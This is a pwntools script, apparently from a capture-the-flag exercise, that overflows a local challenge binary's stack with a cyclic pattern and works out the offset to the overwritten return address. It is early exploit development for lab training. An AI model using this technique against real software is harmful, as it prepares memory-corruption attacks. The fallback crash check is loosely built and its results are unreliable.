#!/usr/bin/env python3
from pwn import *

# Set up the binary
binary = '/home/ctfplayer/ctf_files/small_boi'
context.binary = binary
context.arch = 'amd64'
context.log_level = 'debug'

# Create a cyclic pattern
pattern = cyclic(512)

# Run the process with the pattern
p = process(binary)
p.sendline(pattern)
p.wait()

# Get the core dump if available
try:
    core = p.corefile
    # Get the stack pointer at crash
    stack = core.rsp
    print(f"Stack pointer at crash: {hex(stack)}")
    
    # Get the value of rbp at crash
    rbp = core.rbp
    print(f"RBP register at crash: {hex(rbp)}")
    
    # Get the value at the top of the stack (return address)
    rip_value = core.read(stack, 8)
    rip = u64(rip_value)
    print(f"Return address overwritten with: {hex(rip)}")
    
    # Find the offset in the pattern
    offset = cyclic_find(p64(rip)[:4])
    print(f"Offset to return address: {offset}")
except:
    print("Could not get core dump. Trying another approach.")
    
    # Try a different approach with a controlled pattern
    for i in range(32, 64):
        pattern = cyclic(i)
        p = process(binary)
        p.sendline(pattern)
        try:
            p.recvall(timeout=1)
            p.wait()
            print(f"Program did not crash with {i} bytes")
        except:
            print(f"Program crashed with {i} bytes")
            offset = i
            break
